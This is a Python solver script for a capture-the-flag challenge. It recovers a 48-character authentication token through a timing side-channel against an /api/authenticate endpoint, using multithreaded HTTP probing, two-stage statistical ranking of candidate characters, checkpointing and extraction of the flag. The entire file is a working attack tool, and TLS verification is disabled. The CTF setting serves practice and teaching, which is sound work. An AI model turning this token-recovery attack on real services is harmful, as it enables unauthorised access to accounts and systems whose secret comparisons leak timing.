#!/usr/bin/env python3
"""
Misc Challenge 4 - Two-Stage Adaptive Timing Side-Channel Solver
=================================================================

Features:
1. Two-Stage Adaptive Screening:
   - Stage 1: fast sweep over the complete charset.
   - Stage 2: deep refinement of the strongest candidates.
2. Dynamic URL synchronization from metadata.json.
3. HTTPAdapter connection pooling with thread-local Sessions.
4. Atomic checkpoint persistence.
5. Automatic token authentication and Flag extraction.
6. Automatic checkpoint reset when the container URL changes.
"""

from __future__ import annotations

import argparse
import json
import os
import re
import statistics
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

import requests
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


BASE_DIR = Path(__file__).resolve().parent
META_FILE = BASE_DIR / "metadata.json"
CHECKPOINT_FILE = BASE_DIR / "checkpoint_token.txt"
LAST_URL_FILE = BASE_DIR / ".last_instance_url"
FLAG_FILE = BASE_DIR / "flag.txt"

TOKEN_LEN = 48
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
FLAG_REGEX = re.compile(r"flag\{[^}]+\}", re.IGNORECASE)

RETRYABLE_STATUS = {502, 503, 504}
DEFAULT_URL = (
    "https://4be0a56c-b5b0-46dd-9e9f-892af2738dca."
    "222.255.138.122.nip.io"
)


class FastTimingOracle:
    def __init__(
        self,
        target_url: str | None = None,
        pool_connections: int = 16,
        pool_maxsize: int = 16,
    ) -> None:
        self.target_url = target_url.rstrip("/") if target_url else ""
        self.pool_connections = pool_connections
        self.pool_maxsize = pool_maxsize
        self._local = threading.local()
        self._url_lock = threading.Lock()

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        session.verify = False

        retry = Retry(
            total=0,
            connect=0,
            read=0,
            redirect=0,
            status=0,
        )

        adapter = HTTPAdapter(
            pool_connections=self.pool_connections,
            pool_maxsize=self.pool_maxsize,
            max_retries=retry,
            pool_block=True,
        )

        session.mount("http://", adapter)
        session.mount("https://", adapter)

        session.headers.update(
            {
                "User-Agent": "Mozilla/5.0 TimingSolver/2.0",
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Connection": "keep-alive",
            }
        )
        return session

    def session(self) -> requests.Session:
        session = getattr(self._local, "session", None)
        if session is None:
            session = self._create_session()
            self._local.session = session
        return session

    @staticmethod
    def _read_metadata_url() -> str:
        if not META_FILE.exists():
            return ""

        try:
            metadata = json.loads(
                META_FILE.read_text(encoding="utf-8")
            )
        except (OSError, json.JSONDecodeError):
            return ""

        candidate = (
            metadata.get("connection_info")
            or metadata.get("instance_url")
            or ""
        )

        if isinstance(candidate, str):
            candidate = candidate.rstrip("/")
            if candidate.startswith(("http://", "https://")):
                return candidate

        return ""

    def sync_target(self) -> str:
        candidate = self._read_metadata_url()

        with self._url_lock:
            current = self.target_url

            if candidate and candidate != current:
                self.target_url = candidate
                self._handle_url_change(current, candidate)

            if not self.target_url:
                self.target_url = DEFAULT_URL

            return self.target_url

    def _handle_url_change(self, old_url: str, new_url: str) -> None:
        previous_url = ""

        try:
            if LAST_URL_FILE.exists():
                previous_url = LAST_URL_FILE.read_text(
                    encoding="utf-8"
                ).strip()
        except OSError:
            pass

        if previous_url and previous_url != new_url:
            try:
                CHECKPOINT_FILE.unlink(missing_ok=True)
            except OSError:
                pass

            print(
                f"\n[!] Container URL changed:\n"
                f"    Old: {previous_url}\n"
                f"    New: {new_url}\n"
                f"    Checkpoint reset."
            )

        try:
            _atomic_write(LAST_URL_FILE, new_url + "\n")
        except OSError:
            pass

    def request(
        self,
        token: str,
        timeout: float = 8.0,
    ) -> tuple[int, float, str] | None:
        url = self.sync_target()

        try:
            started = time.perf_counter()

            response = self.session().post(
                f"{url}/api/authenticate",
                json={"token": token},
                timeout=timeout,
            )

            elapsed = time.perf_counter() - started

            if response.status_code in (200, 401):
                return response.status_code, elapsed, response.text

            if (
                response.status_code in RETRYABLE_STATUS
                or (
                    response.status_code == 404
                    and "frp" in response.text.lower()
                )
            ):
                self.sync_target()

        except requests.RequestException:
            pass

        return None

    def wait_until_ready(self) -> None:
        print("[*] Checking container availability...")

        while True:
            sample = self.request("0" * TOKEN_LEN, timeout=5.0)

            if sample is not None:
                print(
                    f"[*] Container ready "
                    f"(HTTP {sample[0]})!"
                )
                return

            print("[*] Container unavailable; retrying in 3s...")
            time.sleep(3.0)

    def measure_token(
        self,
        token: str,
        rounds: int,
    ) -> list[float]:
        samples: list[float] = []

        for _ in range(rounds):
            while True:
                result = self.request(token)
                if result is not None:
                    samples.append(result[1])
                    break
                time.sleep(1.0)

        return samples

    def measure_batch(
        self,
        tokens: dict[str, str],
        rounds: int,
        workers: int,
    ) -> dict[str, list[float]]:
        results: dict[str, list[float]] = {
            character: [] for character in tokens
        }

        def worker(character: str, token: str) -> tuple[str, float]:
            samples = self.measure_token(token, rounds=1)
            return character, (
                samples[0] if samples else 0.0
            )

        with ThreadPoolExecutor(max_workers=workers) as pool:
            for _ in range(rounds):
                futures = [
                    pool.submit(worker, character, token)
                    for character, token in tokens.items()
                ]

                for future in as_completed(futures):
                    character, elapsed = future.result()

                    if elapsed > 0.0:
                        results[character].append(elapsed)

        return results


def _atomic_write(path: Path, content: str) -> None:
    tmp_path = path.with_name(
        f".{path.name}.{os.getpid()}.{threading.get_ident()}.tmp"
    )

    try:
        tmp_path.write_text(content, encoding="utf-8")
        os.replace(tmp_path, path)
    finally:
        try:
            tmp_path.unlink(missing_ok=True)
        except OSError:
            pass


def read_checkpoint() -> str:
    if not CHECKPOINT_FILE.exists():
        return ""

    try:
        token = CHECKPOINT_FILE.read_text(
            encoding="utf-8"
        ).strip()
    except OSError:
        return ""

    if len(token) > TOKEN_LEN:
        return ""

    if not all(character in CHARSET for character in token):
        return ""

    return token


def save_checkpoint(token: str) -> None:
    _atomic_write(
        CHECKPOINT_FILE,
        token + "\n",
    )


def rank_samples(
    samples: dict[str, list[float]],
) -> list[tuple[str, float]]:
    ranked: list[tuple[str, float]] = []

    for character, values in samples.items():
        if values:
            ranked.append(
                (
                    character,
                    statistics.median(values),
                )
            )

    ranked.sort(key=lambda item: item[1], reverse=True)
    return ranked


def find_character_two_stage(
    oracle: FastTimingOracle,
    known: str,
    position: int,
    stage1_rounds: int,
    stage2_rounds: int,
    top_k: int,
    workers: int,
) -> str:
    started = time.perf_counter()

    padding = "a" * (
        TOKEN_LEN - len(known) - 1
    )

    guesses = {
        character: known + character + padding
        for character in CHARSET
    }

    # Stage 1: inexpensive screening across the entire charset.
    stage1 = oracle.measure_batch(
        guesses,
        rounds=stage1_rounds,
        workers=workers,
    )

    ranked_stage1 = rank_samples(stage1)

    if not ranked_stage1:
        return "a"

    control_median = (
        statistics.median([med for _, med in ranked_stage1])
        if ranked_stage1
        else 0.0
    )

    candidates = [
        character
        for character, _ in ranked_stage1[:top_k]
    ]

    # Stage 2: deep refinement of only the strongest candidates.
    refined_guesses = {
        character: guesses[character]
        for character in candidates
    }

    stage2 = oracle.measure_batch(
        refined_guesses,
        rounds=stage2_rounds,
        workers=workers,
    )

    ranked_stage2 = rank_samples(stage2)

    if ranked_stage2:
        best_char, best_time = ranked_stage2[0]
    else:
        best_char, best_time = ranked_stage1[0]

    second_time = (
        ranked_stage2[1][1]
        if len(ranked_stage2) > 1
        else 0.0
    )

    margin_ms = (
        (best_time - second_time) * 1000
        if second_time
        else 0.0
    )

    lift_ms = (
        (best_time - control_median) * 1000
        if control_median
        else 0.0
    )

    elapsed = time.perf_counter() - started

    print(
        f"  [{position + 1:02d}/{TOKEN_LEN}] "
        f"'{best_char}' "
        f"({best_time:.5f}s) | "
        f"Lift +{lift_ms:.1f}ms | "
        f"Margin +{margin_ms:.1f}ms | "
        f"Stage2 {len(candidates)} candidates | "
        f"{elapsed:.1f}s"
    )

    return best_char


def authenticate_and_get_flag(
    oracle: FastTimingOracle,
    token: str,
) -> str | None:
    print(
        f"\n[*] Authenticating recovered token "
        f"({len(token)}/{TOKEN_LEN})..."
    )

    result = oracle.request(
        token,
        timeout=15.0,
    )

    if result is None:
        print("[!] Authentication request failed.")
        return None

    status, elapsed, body = result

    print(
        f"[*] HTTP {status} "
        f"({elapsed:.4f}s)"
    )
    print(f"[*] Response: {body}")

    match = FLAG_REGEX.search(body)

    if match:
        return match.group(0)

    return None


def main() -> int:
    parser = argparse.ArgumentParser(
        description=(
            "Two-Stage Adaptive Timing "
            "Side-Channel Solver"
        )
    )

    parser.add_argument(
        "url",
        nargs="?",
        help="Target container URL (optional)",
    )

    parser.add_argument(
        "--workers",
        type=int,
        default=6,
        help="Concurrent HTTP workers (default: 6)",
    )

    parser.add_argument(
        "--stage1-rounds",
        type=int,
        default=2,
        help="Samples per candidate in Stage 1 (default: 2)",
    )

    parser.add_argument(
        "--stage2-rounds",
        type=int,
        default=6,
        help="Samples per candidate in Stage 2 (default: 6)",
    )

    parser.add_argument(
        "--top-k",
        type=int,
        default=6,
        help="Candidates retained for Stage 2 (default: 6)",
    )

    parser.add_argument(
        "--force-rescan",
        action="store_true",
        help="Discard checkpoint and start from position zero",
    )

    args = parser.parse_args()

    if args.workers < 1:
        parser.error("--workers must be >= 1")

    if args.stage1_rounds < 1:
        parser.error("--stage1-rounds must be >= 1")

    if args.stage2_rounds < 1:
        parser.error("--stage2-rounds must be >= 1")

    if not 1 <= args.top_k <= len(CHARSET):
        parser.error(
            f"--top-k must be between 1 and {len(CHARSET)}"
        )

    oracle = FastTimingOracle(
        target_url=args.url,
        pool_connections=max(args.workers * 2, 8),
        pool_maxsize=max(args.workers * 2, 8),
    )

    oracle.sync_target()

    print("=" * 80)
    print("TWO-STAGE ADAPTIVE TIMING SIDE-CHANNEL SOLVER")
    print("=" * 80)
    print(f"Target URL       : {oracle.target_url}")
    print(f"Token length     : {TOKEN_LEN}")
    print(f"Charset size     : {len(CHARSET)}")
    print(f"Workers          : {args.workers}")
    print(f"Stage 1 rounds   : {args.stage1_rounds}")
    print(f"Stage 2 rounds   : {args.stage2_rounds}")
    print(f"Stage 2 Top-K    : {args.top_k}")
    print("=" * 80)

    if args.force_rescan:
        try:
            CHECKPOINT_FILE.unlink(missing_ok=True)
        except OSError:
            pass
        known = ""
    else:
        known = read_checkpoint()

    print(
        f"[*] Checkpoint: "
        f"'{known}' "
        f"({len(known)}/{TOKEN_LEN})"
    )

    oracle.wait_until_ready()

    if len(known) == TOKEN_LEN:
        flag = authenticate_and_get_flag(
            oracle,
            known,
        )

        if flag:
            print(f"\nFLAG: {flag}")
            _atomic_write(
                FLAG_FILE,
                flag + "\n",
            )
            return 0

        print(
            "[!] Existing checkpoint did not produce a flag; "
            "resuming with a full rescan."
        )

        known = ""
        save_checkpoint(known)

    started_all = time.perf_counter()
    initial_length = len(known)

    for position in range(len(known), TOKEN_LEN):
        # Re-sync before every character so a restarted container
        # is noticed as early as possible.
        oracle.sync_target()

        character = find_character_two_stage(
            oracle=oracle,
            known=known,
            position=position,
            stage1_rounds=args.stage1_rounds,
            stage2_rounds=args.stage2_rounds,
            top_k=args.top_k,
            workers=args.workers,
        )

        known += character
        save_checkpoint(known)

        completed = len(known) - initial_length
        remaining = TOKEN_LEN - len(known)
        elapsed = time.perf_counter() - started_all

        average = (
            elapsed / completed
            if completed > 0
            else 0.0
        )

        eta = average * remaining
        percentage = (
            len(known) / TOKEN_LEN * 100
        )

        print(
            f"      Token: {known} "
            f"[{percentage:.1f}%] "
            f"ETA ~{eta:.0f}s"
        )

    print("\n" + "=" * 80)
    print(f"RECOVERED TOKEN: {known}")
    print("=" * 80)

    flag = authenticate_and_get_flag(
        oracle,
        known,
    )

    if flag:
        print(f"\n{'=' * 80}")
        print(f"FLAG: {flag}")
        print(f"{'=' * 80}")

        _atomic_write(
            FLAG_FILE,
            flag + "\n",
        )

        return 0

    print(
        "\n[!] Token recovered, but no flag was found "
        "in the authentication response."
    )

    return 1


if __name__ == "__main__":
    sys.exit(main())
